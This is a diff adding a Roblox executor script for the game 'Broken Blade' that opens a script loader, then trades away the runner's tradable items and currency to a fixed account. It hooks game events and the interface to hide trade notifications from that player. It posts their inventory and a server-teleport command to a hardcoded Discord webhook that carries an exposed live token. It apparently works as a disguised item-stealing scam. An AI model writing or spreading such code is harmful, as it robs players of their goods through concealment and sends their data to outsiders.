@@ -1,0 +1,1922 @@
+--[[
+    Broken Blade — Alt Trade Auto (Magicbow01)
+    Executar na conta ALT com Potassium, dentro do mapa (character spawnado).
+
+    Fluxo:
+      0. Abre Wawa Script Loader (No Key / Key)
+      1. Detecta Magicbow01 no servidor
+      2. Fica enviando trade request em loop (mesmo se rejeitar)
+      3. Main aceita manualmente
+      4. Alt envia inventário para Discord (webhook, ~3s após executar)
+      5. Alt adiciona itens negociáveis + moeda
+      6. Alt confirma (1ª)
+      7. Aguarda main confirmar (1ª)
+      8. Alt confirma (2ª / final)
+]]
+
+-- ========== CONFIG ==========
+local CONFIG = {
+    TARGET_NAME = "Mag1cb0w1",       -- username Roblox (não DisplayName)
+    TARGET_USER_ID = nil,             -- opcional: UserId fixo da main (ex: 12345678)
+    INCLUDE_CURRENCY = true,            -- incluir moeda tradeável (itemId 301)
+    CURRENCY_ID = 301,
+    ADD_ITEM_DELAY = 0.15,            -- segundos entre cada AddItem
+    POST_ADD_DELAY = 0.5,             -- espera antes da 1ª confirmação
+    MONITOR_INTERVAL = 1,             -- poll mais rápido
+    REQUEST_COOLDOWN = 2,             -- reenvia trade rápido após rejeitar/cancelar
+    REQUEST_TIMEOUT = 31,             -- timeout pending (~30s do jogo)
+    REJECT_RETRY_DELAY = 0.5,         -- espera mínima após rejeição
+    HIDE_TRADE_HUD = true,            -- remove HUD de trade da alt
+    SUPPRESS_TRADE_MESSAGES = true,   -- bloqueia toasts "Trade Request Sent", etc.
+    BOOT_WAIT = 0.75,                 -- espera após spawn (igual hub)
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1517528422342201537/DMsqYo-AdAoyeEFYKOaNrexoqHOw1RPlgeWYv4LHJYsyzKWpsSU6guInWUbeBJA805sR",
+    KP1_ITEM_ID = 50004,              -- Katana Piece I
+    -- ordem fixa na seção "Raros" (só aparece se count > 0)
+    RARE_ITEM_IDS = {
+        50992, -- Arkenstone
+        50205, -- Red Orb
+        50305, -- Eyepatch
+        50995, -- Sky Key
+        50996, -- Soul Stone
+        50998, -- Boss Key
+        50997, -- Crimson Beherit
+        50104, -- Holy Grail
+        50204, -- Moon Piece
+        50304, -- Sacrifice Piece
+        40008, -- Space Chest
+        40007, -- Holy Chest
+        40006, -- Mythical Chest
+        40005, -- Epic Chest
+        50999, -- Fire Seed
+        50006, -- Katana Piece III
+        50005, -- Katana Piece II
+    },
+    WEBHOOK_REST_MAX_LINES = 40,      -- truncar resto se inventário enorme
+    WEBHOOK_ON_START = true,          -- manda inventário ao executar o script
+    WEBHOOK_ON_TRADE = true,          -- manda de novo quando main aceita o trade
+    WEBHOOK_INCLUDE_TELEPORT = true,  -- manda comando pronto pra copiar e ir pro server da alt
+    PLACE_ID = nil,                   -- nil = usa game.PlaceId automaticamente
+    RUN_WAWA_LAUNCHER = true,         -- abre Wawa Script Loader ao executar (embutido)
+}
+
+-- ========== SERVICES ==========
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+-- ========== LOG ==========
+local function log(...)
+    print("[AltTrade]", ...)
+end
+
+local function warnLog(...)
+    warn("[AltTrade]", ...)
+end
+
+-- ========== TEvent / NETWORKING ==========
+local function isTEventTable(value)
+    return type(value) == "table"
+        and type(value.FireRemote) == "function"
+        and type(value.OnRemote) == "function"
+end
+
+local function finalizeTEvent(tev)
+    if tev and tev.Setup then
+        pcall(tev.Setup)
+    end
+    return tev
+end
+
+local function tryRequireTEventModule(modScript)
+    if not modScript or not modScript:IsA("ModuleScript") then
+        return nil
+    end
+    local ok, tev = pcall(require, modScript)
+    if ok and isTEventTable(tev) then
+        return finalizeTEvent(tev)
+    end
+    return nil
+end
+
+local function waitForGameBootstrap()
+    ReplicatedStorage:WaitForChild("Shared", 60)
+    ReplicatedStorage:WaitForChild("Remote_Event", 60)
+    if not LocalPlayer.Character then
+        LocalPlayer.CharacterAdded:Wait()
+    end
+    task.wait(CONFIG.BOOT_WAIT)
+end
+
+local function findDetachedTEventModule()
+    local seen = {}
+    local candidates = {}
+
+    local function addCandidate(inst)
+        if not inst or seen[inst] then
+            return
+        end
+        seen[inst] = true
+        if inst:IsA("ModuleScript") and inst.Name == "Module" then
+            table.insert(candidates, inst)
+        end
+    end
+
+    if getnilinstances then
+        for _, inst in getnilinstances() do
+            addCandidate(inst)
+        end
+    end
+
+    if getgc then
+        for _, obj in getgc(true) do
+            if typeof(obj) == "Instance" then
+                addCandidate(obj)
+            end
+        end
+    end
+
+    for _, modScript in candidates do
+        local tev = tryRequireTEventModule(modScript)
+        if tev then
+            return tev
+        end
+    end
+end
+
+local function findCachedTEventTable()
+    if getgc then
+        for _, value in getgc(true) do
+            if isTEventTable(value) then
+                return finalizeTEvent(value)
+            end
+        end
+    end
+
+    if getreg then
+        for _, value in getreg() do
+            if isTEventTable(value) then
+                return finalizeTEvent(value)
+            end
+        end
+    end
+end
+
+local function findEventFolder()
+    local core = ReplicatedStorage:FindFirstChild("Shared")
+        and ReplicatedStorage.Shared:FindFirstChild("Core")
+    local tevRoot = core and core:FindFirstChild("TEvent")
+
+    if tevRoot then
+        local eventFolder = tevRoot:FindFirstChild("Event")
+        if eventFolder and eventFolder:FindFirstChild("RemoteEvent") then
+            return eventFolder
+        end
+    end
+
+    local gameEvent = game:FindFirstChild("Event")
+    if gameEvent and gameEvent:FindFirstChild("RemoteEvent") then
+        return gameEvent
+    end
+
+    if getnilinstances then
+        for _, inst in getnilinstances() do
+            if inst.Name == "Event" and inst:FindFirstChild("RemoteEvent") then
+                return inst
+            end
+        end
+    end
+end
+
+local function buildTEventShim(eventFolder)
+    local okRemote, RemoteEvent = pcall(require, eventFolder:WaitForChild("RemoteEvent", 15))
+    if not okRemote or type(RemoteEvent) ~= "table" or type(RemoteEvent.new) ~= "function" then
+        return nil
+    end
+
+    pcall(RemoteEvent.SetupEventBinding)
+
+    return finalizeTEvent({
+        FireRemote = function(name, ...)
+            RemoteEvent.new(name):FireServer(...)
+        end,
+        OnRemote = function(name, handler)
+            return RemoteEvent.new(name).OnClientEvent:Connect(handler)
+        end,
+        Setup = function()
+            pcall(RemoteEvent.SetupEventBinding)
+        end,
+    })
+end
+
+local function loadNetworking()
+    waitForGameBootstrap()
+
+    local root = ReplicatedStorage.Shared.Core:WaitForChild("TEvent", 60)
+    local strategies = {
+        function()
+            return tryRequireTEventModule(root:FindFirstChild("Module"))
+        end,
+        function()
+            return tryRequireTEventModule(root)
+        end,
+        findDetachedTEventModule,
+        findCachedTEventTable,
+        function()
+            local eventFolder = findEventFolder()
+            return eventFolder and buildTEventShim(eventFolder) or nil
+        end,
+    }
+
+    for attempt = 1, 12 do
+        for _, strategy in ipairs(strategies) do
+            local ok, net = pcall(strategy)
+            if ok and isTEventTable(net) then
+                log("Rede OK (estrategia", attempt, ")")
+                return net
+            end
+        end
+        task.wait(0.5)
+    end
+
+    error("[AltTrade] Rede nao carregou — entra no mapa, espera spawnar, executa de novo")
+end
+
+-- ========== TRADE API (sem depender de Trade.client) ==========
+local Net = loadNetworking()
+local Trade = require(ReplicatedStorage.Shared.Features.Trade)
+
+-- ========== SUPRIMIR TOASTS / POPUPS DE TRADE ==========
+local TRADE_TIP_IDS = {
+    ["250013"] = true, -- Trade Request Sent
+    ["250014"] = true, -- One Trade Request Already Sent
+    ["250015"] = true, -- Trade Request Rejected
+    ["250016"] = true, -- Trade Cancel
+    ["250017"] = true, -- Trade Complete
+    [250013] = true,
+    [250014] = true,
+    [250015] = true,
+    [250016] = true,
+    [250017] = true,
+}
+
+local TRADE_MSG_PHRASES = {
+    "trade request",
+    "trade cancel",
+    "trade complete",
+    "trade rejected",
+    "trade declined",
+    "incoming trade",
+    "one trade request",
+}
+
+local function isTradeToastText(text)
+    text = string.lower(tostring(text or ""))
+    if text == "" then
+        return false
+    end
+    for _, phrase in ipairs(TRADE_MSG_PHRASES) do
+        if string.find(text, phrase, 1, true) then
+            return true
+        end
+    end
+    return false
+end
+
+local function isTradeToastPayload(...)
+    local argc = select("#", ...)
+    for i = 1, argc do
+        local payload = select(i, ...)
+        if type(payload) == "table" then
+            local id = payload.id or payload.tipId
+            if id ~= nil then
+                if TRADE_TIP_IDS[id] or TRADE_TIP_IDS[tostring(id)] then
+                    return true
+                end
+            end
+            if isTradeToastText(payload.text) or isTradeToastText(payload.message) then
+                return true
+            end
+        elseif type(payload) == "string" or type(payload) == "number" then
+            if TRADE_TIP_IDS[payload] or TRADE_TIP_IDS[tostring(payload)] then
+                return true
+            end
+            if isTradeToastText(payload) then
+                return true
+            end
+        end
+    end
+    return false
+end
+
+local function isTradeNotifyPayload(...)
+    local payload = select(1, ...)
+    return type(payload) == "table" and payload.type == Trade.NOTIFY.TradeTip
+end
+
+local function getEventModule(name)
+    local candidates = {
+        function()
+            local root = ReplicatedStorage.Shared.Core:FindFirstChild("TEvent")
+            local folder = root and root:FindFirstChild("Event")
+            return folder and require(folder:FindFirstChild(name))
+        end,
+        function()
+            local gameEvent = game:FindFirstChild("Event")
+            return gameEvent and require(gameEvent:FindFirstChild(name))
+        end,
+    }
+    for _, tryRequire in ipairs(candidates) do
+        local ok, mod = pcall(tryRequire)
+        if ok and type(mod) == "table" and type(mod.new) == "function" then
+            return mod
+        end
+    end
+    return nil
+end
+
+local function patchTriggerOnInstance(ev, shouldBlock)
+    if type(ev) ~= "table" or ev._altTradeMsgPatch then
+        return false
+    end
+    if type(ev.Trigger) ~= "function" then
+        return false
+    end
+    ev._altTradeMsgPatch = true
+    local origTrigger = ev.Trigger
+    ev.Trigger = function(self, ...)
+        if shouldBlock(...) then
+            return
+        end
+        return origTrigger(self, ...)
+    end
+    return true
+end
+
+local function patchEventTrigger(eventModule, eventName, shouldBlock)
+    if not eventModule then
+        return false
+    end
+    local ok, ev = pcall(eventModule.new, eventName)
+    if ok and ev then
+        return patchTriggerOnInstance(ev, shouldBlock)
+    end
+    return false
+end
+
+local function patchAllRemoteTriggers()
+    local patched = 0
+
+    if getgc then
+        for _, obj in getgc(true) do
+            if type(obj) == "table" then
+                local name = rawget(obj, "_name")
+                if name == "Tip" and patchTriggerOnInstance(obj, isTradeToastPayload) then
+                    patched = patched + 1
+                elseif name == "TipLocal" and patchTriggerOnInstance(obj, isTradeToastPayload) then
+                    patched = patched + 1
+                elseif name == Trade.NOTIFY_EVENT and patchTriggerOnInstance(obj, isTradeNotifyPayload) then
+                    patched = patched + 1
+                end
+            end
+        end
+    end
+
+    local RemoteEvent = getEventModule("RemoteEvent")
+    local BindableEvent = getEventModule("BindableEvent")
+    if patchEventTrigger(RemoteEvent, "Tip", isTradeToastPayload) then patched = patched + 1 end
+    if patchEventTrigger(BindableEvent, "TipLocal", isTradeToastPayload) then patched = patched + 1 end
+    if patchEventTrigger(RemoteEvent, Trade.NOTIFY_EVENT, isTradeNotifyPayload) then patched = patched + 1 end
+
+    return patched
+end
+
+local tipUiHooked = false
+
+local function nukeTradeToastGui(gui, tipRoot)
+    if not gui or not gui:IsA("GuiObject") then
+        return false
+    end
+    local label = gui:FindFirstChild("Text1", true)
+    local text = label and label.Text or ""
+    if isTradeToastText(text) then
+        gui.Visible = false
+        pcall(function()
+            gui:Destroy()
+        end)
+        if tipRoot and tipRoot:IsA("GuiObject") then
+            tipRoot.Visible = false
+        end
+        return true
+    end
+    return false
+end
+
+local function hookTipUi()
+    if tipUiHooked or not CONFIG.SUPPRESS_TRADE_MESSAGES then
+        return
+    end
+
+    local playerGui = LocalPlayer:FindFirstChild("PlayerGui")
+    local home = playerGui and playerGui:FindFirstChild("Main")
+    home = home and home:FindFirstChild("HomePage")
+    local tipRoot = home and home:FindFirstChild("Tip")
+    local content = tipRoot and tipRoot:FindFirstChild("Content")
+    if not content then
+        return
+    end
+
+    tipUiHooked = true
+
+    local function onTipChildAdded(child)
+        if string.sub(child.Name, 1, 11) == "RuntimeTip_" then
+            child.Visible = false
+            tipRoot.Visible = false
+        end
+        nukeTradeToastGui(child, tipRoot)
+        if child:IsA("GuiObject") then
+            child:GetPropertyChangedSignal("Visible"):Connect(function()
+                if string.sub(child.Name, 1, 11) == "RuntimeTip_" and child.Visible then
+                    child.Visible = false
+                    tipRoot.Visible = false
+                end
+                nukeTradeToastGui(child, tipRoot)
+            end)
+        end
+        for _, desc in child:GetDescendants() do
+            if desc:IsA("TextLabel") then
+                desc:GetPropertyChangedSignal("Text"):Connect(function()
+                    if isTradeToastText(desc.Text) then
+                        nukeTradeToastGui(child, tipRoot)
+                    end
+                end)
+                if isTradeToastText(desc.Text) then
+                    nukeTradeToastGui(child, tipRoot)
+                    break
+                end
+            end
+        end
+        task.defer(function()
+            nukeTradeToastGui(child, tipRoot)
+        end)
+    end
+
+    content.ChildAdded:Connect(onTipChildAdded)
+
+    for _, child in content:GetChildren() do
+        onTipChildAdded(child)
+    end
+
+    tipRoot:GetPropertyChangedSignal("Visible"):Connect(function()
+        if not tipRoot.Visible then
+            return
+        end
+        local sawTrade = false
+        for _, child in content:GetChildren() do
+            if nukeTradeToastGui(child, tipRoot) then
+                sawTrade = true
+            end
+        end
+        if sawTrade then
+            tipRoot.Visible = false
+        end
+    end)
+end
+
+local function installTradeMessageSuppressor()
+    if not CONFIG.SUPPRESS_TRADE_MESSAGES then
+        return
+    end
+
+    patchAllRemoteTriggers()
+    hookTipUi()
+
+    if getconnections then
+        pcall(function()
+            local RemoteEvent = getEventModule("RemoteEvent")
+            if not RemoteEvent then
+                return
+            end
+            local tipEv = RemoteEvent.new("Tip")
+            local eventObj = tipEv.OnClientEvent
+            local signal = eventObj.Event or eventObj
+            for _, conn in getconnections(signal) do
+                local fn = conn.Function
+                if type(fn) == "function" and not conn._altTradeWrapped then
+                    conn._altTradeWrapped = true
+                    local old = fn
+                    conn.Function = function(...)
+                        if isTradeToastPayload(...) then
+                            return
+                        end
+                        return old(...)
+                    end
+                end
+            end
+        end)
+    end
+end
+
+local function suppressTradeMessages()
+    if not CONFIG.SUPPRESS_TRADE_MESSAGES then
+        return
+    end
+
+    hookTipUi()
+
+    pcall(function()
+        local ConfirmPopupHandle = require(ReplicatedStorage.Client.UI.API.ConfirmPopupHandle)
+        ConfirmPopupHandle.Hide("TradeIncoming")
+    end)
+
+    local home = LocalPlayer:FindFirstChild("PlayerGui")
+        and LocalPlayer.PlayerGui:FindFirstChild("Main")
+        and LocalPlayer.PlayerGui.Main:FindFirstChild("HomePage")
+    local tipRoot = home and home:FindFirstChild("Tip")
+    local content = tipRoot and (tipRoot:FindFirstChild("Content") or tipRoot)
+
+    if content then
+        for _, child in content:GetChildren() do
+            if string.sub(child.Name, 1, 11) == "RuntimeTip_" then
+                nukeTradeToastGui(child, tipRoot)
+            end
+        end
+    end
+end
+
+installTradeMessageSuppressor()
+
+RunService.RenderStepped:Connect(function()
+    if not CONFIG.SUPPRESS_TRADE_MESSAGES then
+        return
+    end
+    suppressTradeMessages()
+end)
+
+task.spawn(function()
+    while CONFIG.SUPPRESS_TRADE_MESSAGES do
+        patchAllRemoteTriggers()
+        hookTipUi()
+        task.wait(1)
+    end
+end)
+
+local TradeApi = {}
+
+function TradeApi.fireOp(payload)
+    Net.FireRemote(Trade.OP_EVENT, payload)
+end
+
+function TradeApi.RequestTrade(userId)
+    TradeApi.fireOp({
+        op = Trade.OP.RequestTrade,
+        targetUserId = userId,
+    })
+end
+
+function TradeApi.AddItem(sessionId, itemUid, count)
+    TradeApi.fireOp({
+        op = Trade.OP.AddItem,
+        sessionId = sessionId,
+        itemUid = itemUid,
+        count = count or 1,
+    })
+end
+
+function TradeApi.Confirm(sessionId)
+    TradeApi.fireOp({
+        op = Trade.OP.Confirm,
+        sessionId = sessionId,
+    })
+end
+
+function TradeApi.SecondConfirm(sessionId)
+    TradeApi.fireOp({
+        op = Trade.OP.SecondConfirm,
+        sessionId = sessionId,
+    })
+end
+
+function TradeApi.Cancel(sessionId)
+    TradeApi.fireOp({
+        op = Trade.OP.Cancel,
+        sessionId = sessionId,
+    })
+end
+
+function TradeApi.RespondRequest(sessionId, accepted)
+    TradeApi.fireOp({
+        op = Trade.OP.RespondRequest,
+        sessionId = sessionId,
+        accepted = accepted == true,
+    })
+end
+
+-- ========== INVENTÁRIO TRADEÁVEL ==========
+local Config = require(ReplicatedStorage.Config)
+local EcoValueState = require(ReplicatedStorage.Shared.Features.EcoValueState)
+local Value = require(ReplicatedStorage.Shared.Core.Value)
+
+local function waitForValue(key, timeout)
+    timeout = timeout or 30
+    for _ = 1, timeout * 2 do
+        local slot = Value[key]
+        if slot and type(slot.Value) == "table" then
+            return slot.Value
+        end
+        task.wait(0.5)
+    end
+    return nil
+end
+
+local function normalizeUid(uid)
+    if type(uid) == "string" and string.sub(uid, 1, 2) == "@~" then
+        return string.sub(uid, 3)
+    end
+    return tostring(uid)
+end
+
+local function getTradableCurrencyAmount()
+    local currencyCfg = Config.Item and Config.Item.Currency
+    if currencyCfg then
+        currencyCfg = currencyCfg[CONFIG.CURRENCY_ID]
+    end
+    local ecoName = type(currencyCfg) == "table" and currencyCfg.name
+    if type(ecoName) ~= "string" or ecoName == "" then
+        return 0
+    end
+
+    local ecoSlot = Value.Eco
+    local eco = ecoSlot and type(ecoSlot.Value) == "table" and ecoSlot.Value
+    if not eco then
+        eco = waitForValue("Eco", 15)
+    end
+    if not eco then
+        return 0
+    end
+
+    return EcoValueState.GetTradableAmount(eco, ecoName)
+end
+
+local function resolveItemMeta(itemId, entry)
+    local cfg = Config.GetGlobal and Config.GetGlobal(itemId) or nil
+    return {
+        itemId = itemId,
+        name = type(cfg) == "table" and cfg.name or ("Item " .. tostring(itemId)),
+        rarity = entry and entry.rarity or (type(cfg) == "table" and cfg.rarity or 1),
+        itemType = entry and (entry.type or entry.itemType) or (type(cfg) == "table" and cfg.type or "Item"),
+    }
+end
+
+local function sortLikeGame(a, b)
+    local ra = tonumber(a.rarity) or 0
+    local rb = tonumber(b.rarity) or 0
+    if ra == rb then
+        return (tonumber(a.itemId) or 0) < (tonumber(b.itemId) or 0)
+    end
+    return rb < ra
+end
+
+local function formatCount(n)
+    local s = tostring(math.floor(tonumber(n) or 0))
+    local out, k = s:reverse():gsub("(%d%d%d)", "%1,")
+    if k == 0 then
+        return s
+    end
+    out = out:reverse():gsub("^,", "")
+    return out
+end
+
+local function getInventorySnapshot()
+    local byId = {}
+    local stacks = {}
+
+    local function addStack(itemId, count, entry, itemUid)
+        if not itemId or count <= 0 then
+            return
+        end
+        local meta = resolveItemMeta(itemId, entry)
+        local row = {
+            itemId = itemId,
+            itemUid = itemUid,
+            count = count,
+            name = meta.name,
+            rarity = meta.rarity,
+            itemType = meta.itemType,
+        }
+        table.insert(stacks, row)
+        local prev = byId[itemId]
+        byId[itemId] = (prev or 0) + count
+    end
+
+    if CONFIG.INCLUDE_CURRENCY then
+        local amount = getTradableCurrencyAmount()
+        if amount > 0 then
+            addStack(CONFIG.CURRENCY_ID, amount, { type = "Currency" }, "Currency_" .. tostring(CONFIG.CURRENCY_ID))
+        end
+    end
+
+    local bag = waitForValue("BackpackBag", 20)
+    if type(bag) == "table" and type(bag.items) == "table" then
+        for key, entry in bag.items do
+            if type(entry) == "table" then
+                local itemId = tonumber(entry.itemId)
+                if itemId then
+                    itemId = math.floor(itemId)
+                end
+
+                local total = tonumber(entry.count) or 0
+                total = math.max(0, math.floor(total))
+                local bound = tonumber(entry.bindCount) or 0
+                bound = math.max(0, math.floor(bound))
+                local tradable = total - math.clamp(bound, 0, total)
+
+                if itemId and tradable > 0 then
+                    addStack(itemId, tradable, entry, normalizeUid(entry.uid or key))
+                end
+            end
+        end
+    end
+
+    table.sort(stacks, sortLikeGame)
+    return stacks, byId
+end
+
+local function getTradeableItems()
+    local stacks = getInventorySnapshot()
+    local result = {}
+    for _, row in ipairs(stacks) do
+        table.insert(result, {
+            itemUid = row.itemUid,
+            count = row.count,
+        })
+    end
+    return result
+end
+
+-- ========== DISCORD WEBHOOK ==========
+local RARE_ID_SET = {}
+for _, id in ipairs(CONFIG.RARE_ITEM_IDS) do
+    RARE_ID_SET[id] = true
+end
+
+local webhookSentStartup = false
+local webhookSentTrade = false
+
+local function isHttpSuccess(statusCode)
+    local code = tonumber(statusCode)
+    return code ~= nil and code >= 200 and code < 300
+end
+
+local function extractHttpStatus(res)
+    if type(res) ~= "table" then
+        return nil, res
+    end
+    local code = res.StatusCode or res.status or res.Status or res.StatusCode
+    local body = res.Body or res.body or res.Data or res.data
+    return code, body
+end
+
+local function httpPostJson(url, payload)
+    local okEncode, body = pcall(HttpService.JSONEncode, HttpService, payload)
+    if not okEncode then
+        return false, "JSONEncode falhou: " .. tostring(body)
+    end
+
+    local req = {
+        Url = url,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = body,
+    }
+
+    local function tryNamedRequest(name, fn)
+        local ok, res = pcall(fn, req)
+        if not ok then
+            return false, name .. " crash: " .. tostring(res)
+        end
+        local code, resBody = extractHttpStatus(res)
+        if code ~= nil then
+            if isHttpSuccess(code) then
+                return true, name .. " HTTP " .. tostring(code)
+            end
+            return false, name .. " HTTP " .. tostring(code) .. " | " .. tostring(resBody):sub(1, 200)
+        end
+        if res == nil or res == "" then
+            return true, name .. " OK"
+        end
+        if type(res) == "string" and #res < 500 then
+            return true, name .. " OK"
+        end
+        return true, name .. " OK (sem status)"
+    end
+
+    if typeof(request) == "function" then
+        local ok, msg = tryNamedRequest("request", request)
+        if ok then return true, msg end
+        warnLog(msg)
+    end
+    if syn and typeof(syn.request) == "function" then
+        local ok, msg = tryNamedRequest("syn.request", syn.request)
+        if ok then return true, msg end
+        warnLog(msg)
+    end
+    if http and typeof(http.request) == "function" then
+        local ok, msg = tryNamedRequest("http.request", http.request)
+        if ok then return true, msg end
+        warnLog(msg)
+    end
+    if fluxus and typeof(fluxus.request) == "function" then
+        local ok, msg = tryNamedRequest("fluxus.request", fluxus.request)
+        if ok then return true, msg end
+        warnLog(msg)
+    end
+    if typeof(http_request) == "function" then
+        local ok, msg = tryNamedRequest("http_request", http_request)
+        if ok then return true, msg end
+        warnLog(msg)
+    end
+
+    local okReq, resReq = pcall(function()
+        return HttpService:RequestAsync({
+            Url = url,
+            Method = "POST",
+            Headers = req.Headers,
+            Body = body,
+        })
+    end)
+    if okReq and type(resReq) == "table" and resReq.Success then
+        return true, "HttpService:RequestAsync"
+    end
+    if okReq and type(resReq) == "table" then
+        warnLog("RequestAsync:", tostring(resReq.StatusCode), tostring(resReq.Body):sub(1, 200))
+    end
+
+    local okPost, resPost = pcall(function()
+        return HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson)
+    end)
+    if okPost then
+        return true, "HttpService:PostAsync"
+    end
+
+    return false, "HTTP bloqueado — ativa Http Requests no Potassium. Ultimo erro: " .. tostring(resPost)
+end
+
+local function getServerTeleportInfo()
+    local placeId = CONFIG.PLACE_ID or game.PlaceId
+    local jobId = game.JobId
+    return placeId, jobId
+end
+
+local function buildTeleportCommand()
+    local placeId, jobId = getServerTeleportInfo()
+    if not placeId or not jobId or jobId == "" then
+        return nil
+    end
+    return string.format(
+        'game:GetService("TeleportService"):TeleportToPlaceInstance(%s, "%s", game.Players.LocalPlayer)',
+        tostring(placeId),
+        tostring(jobId)
+    )
+end
+
+local function buildTeleportDiscordBlock()
+    local cmd = buildTeleportCommand()
+    if not cmd then
+        return "_JobId indisponível_"
+    end
+    return "```lua\n" .. cmd .. "\n```"
+end
+
+local function buildWebhookPlainText(stacks, byId, reason)
+    local kp1 = byId[CONFIG.KP1_ITEM_ID] or 0
+    local lines = {
+        "**Alt:** " .. LocalPlayer.Name,
+        "**Motivo:** " .. tostring(reason or "inventario"),
+    }
+
+    if CONFIG.WEBHOOK_INCLUDE_TELEPORT then
+        table.insert(lines, "")
+        table.insert(lines, "🚀 **Teleport**")
+        table.insert(lines, buildTeleportDiscordBlock())
+    end
+
+    table.insert(lines, "")
+    table.insert(lines, "**Katana Piece I:** " .. formatCount(kp1))
+    table.insert(lines, "")
+    table.insert(lines, "**Raros:**")
+
+    local rareCount = 0
+    for _, rareId in ipairs(CONFIG.RARE_ITEM_IDS) do
+        local count = byId[rareId]
+        if count and count > 0 then
+            rareCount = rareCount + 1
+            local meta = resolveItemMeta(rareId, nil)
+            table.insert(lines, string.format("- %s x%s", meta.name, formatCount(count)))
+        end
+    end
+    if rareCount == 0 then
+        table.insert(lines, "- (nenhum)")
+    end
+
+    table.insert(lines, "")
+    table.insert(lines, "**Resto (rarity desc):**")
+    local restAdded = 0
+    for _, row in ipairs(stacks) do
+        local id = row.itemId
+        if id ~= CONFIG.KP1_ITEM_ID and not RARE_ID_SET[id] then
+            restAdded = restAdded + 1
+            if restAdded <= (CONFIG.WEBHOOK_REST_MAX_LINES or 40) then
+                table.insert(lines, string.format("- %s x%s", row.name, formatCount(row.count)))
+            end
+        end
+    end
+    if restAdded == 0 then
+        table.insert(lines, "- (nenhum)")
+    elseif restAdded > (CONFIG.WEBHOOK_REST_MAX_LINES or 40) then
+        table.insert(lines, string.format("- ... e mais %d stack(s)", restAdded - (CONFIG.WEBHOOK_REST_MAX_LINES or 40)))
+    end
+
+    local text = table.concat(lines, "\n")
+    if #text > 1900 then
+        text = string.sub(text, 1, 1880) .. "\n...(truncado)"
+    end
+    return text
+end
+
+local function buildWebhookEmbed(stacks, byId)
+    local kp1 = byId[CONFIG.KP1_ITEM_ID] or 0
+    local rareLines = {}
+    local restLines = {}
+
+    for _, rareId in ipairs(CONFIG.RARE_ITEM_IDS) do
+        local count = byId[rareId]
+        if count and count > 0 then
+            local meta = resolveItemMeta(rareId, nil)
+            table.insert(rareLines, string.format("• **%s** × %s", meta.name, formatCount(count)))
+        end
+    end
+
+    for _, row in ipairs(stacks) do
+        local id = row.itemId
+        if id ~= CONFIG.KP1_ITEM_ID and not RARE_ID_SET[id] then
+            table.insert(restLines, string.format("• %s × %s", row.name, formatCount(row.count)))
+        end
+    end
+
+    local maxRest = CONFIG.WEBHOOK_REST_MAX_LINES or 40
+    local restText
+    if #restLines == 0 then
+        restText = "_Nenhum outro item tradeável_"
+    elseif #restLines <= maxRest then
+        restText = table.concat(restLines, "\n")
+    else
+        local shown = {}
+        for i = 1, maxRest do
+            shown[i] = restLines[i]
+        end
+        restText = table.concat(shown, "\n") .. string.format("\n_… e mais %d stack(s)_", #restLines - maxRest)
+    end
+
+    local rareText = #rareLines > 0 and table.concat(rareLines, "\n") or "_Nenhum raro da lista_"
+
+    local function truncateField(text, maxLen)
+        maxLen = maxLen or 1024
+        if #text <= maxLen then
+            return text
+        end
+        return string.sub(text, 1, maxLen - 18) .. "\n_… (truncado)_"
+    end
+
+    local typeCount = 0
+    for _ in byId do
+        typeCount = typeCount + 1
+    end
+
+    local fields = {}
+
+    if CONFIG.WEBHOOK_INCLUDE_TELEPORT then
+        table.insert(fields, {
+            name = "🚀 Teleport",
+            value = buildTeleportDiscordBlock(),
+            inline = false,
+        })
+    end
+
+    table.insert(fields, {
+        name = "Raros",
+        value = truncateField(rareText),
+        inline = false,
+    })
+    table.insert(fields, {
+        name = "Resto (rarity ↓)",
+        value = truncateField(restText),
+        inline = false,
+    })
+    table.insert(fields, {
+        name = "Resumo",
+        value = string.format("%d stack(s) tradeável(is) • %d tipo(s) distintos",
+            #stacks, typeCount),
+        inline = false,
+    })
+
+    return {
+        title = "Alt Trade — " .. LocalPlayer.Name,
+        color = 5763719,
+        description = string.format("**Katana Piece I:** %s", formatCount(kp1)),
+        fields = fields,
+        footer = { text = "Broken Blade • AltTrade" },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+    }
+end
+
+local function sendInventoryWebhook(reason)
+    reason = reason or "trade"
+
+    if CONFIG.WEBHOOK_URL == nil or CONFIG.WEBHOOK_URL == "" then
+        warnLog("WEBHOOK_URL vazio")
+        return
+    end
+
+    if reason == "startup" then
+        if webhookSentStartup or not CONFIG.WEBHOOK_ON_START then
+            return
+        end
+    elseif reason == "trade" then
+        if webhookSentTrade or not CONFIG.WEBHOOK_ON_TRADE then
+            return
+        end
+    end
+
+    log("Preparando webhook (" .. reason .. ")...")
+
+    local stacks, byId = getInventorySnapshot()
+    local plain = buildWebhookPlainText(stacks, byId, reason)
+    local embed = buildWebhookEmbed(stacks, byId)
+    local payload = {
+        content = plain,
+        embeds = { embed },
+    }
+
+    task.spawn(function()
+        local ok, res = httpPostJson(CONFIG.WEBHOOK_URL, payload)
+        if ok then
+            if reason == "startup" then
+                webhookSentStartup = true
+            elseif reason == "trade" then
+                webhookSentTrade = true
+            end
+            log("Webhook OK (" .. reason .. ") via", tostring(res), "| KP1:", formatCount(byId[CONFIG.KP1_ITEM_ID] or 0))
+            return
+        end
+
+        warnLog("Webhook embed falhou (" .. reason .. "):", tostring(res))
+        warnLog("Tentando fallback content-only...")
+
+        local ok2, res2 = httpPostJson(CONFIG.WEBHOOK_URL, { content = plain })
+        if ok2 then
+            if reason == "startup" then
+                webhookSentStartup = true
+            elseif reason == "trade" then
+                webhookSentTrade = true
+            end
+            log("Webhook OK fallback (" .. reason .. ") via", tostring(res2))
+        else
+            warnLog("Webhook fallback falhou:", tostring(res2))
+            warnLog("Ativa Http Requests no Potassium e executa de novo")
+        end
+    end)
+end
+
+-- ========== STATE MACHINE ==========
+local STATE = "MONITOR"
+local session = nil
+local targetUserId = CONFIG.TARGET_USER_ID
+local itemsAdded = false
+local firstConfirmed = false
+local secondConfirmed = false
+local lastRequestTime = 0
+local processingTrade = false
+local pendingSince = 0
+local tradeHudHooked = false
+
+local TRADE_UI_NAMES = { "Trade", "TradeRequest", "TradeInformation", "TradeHistory" }
+
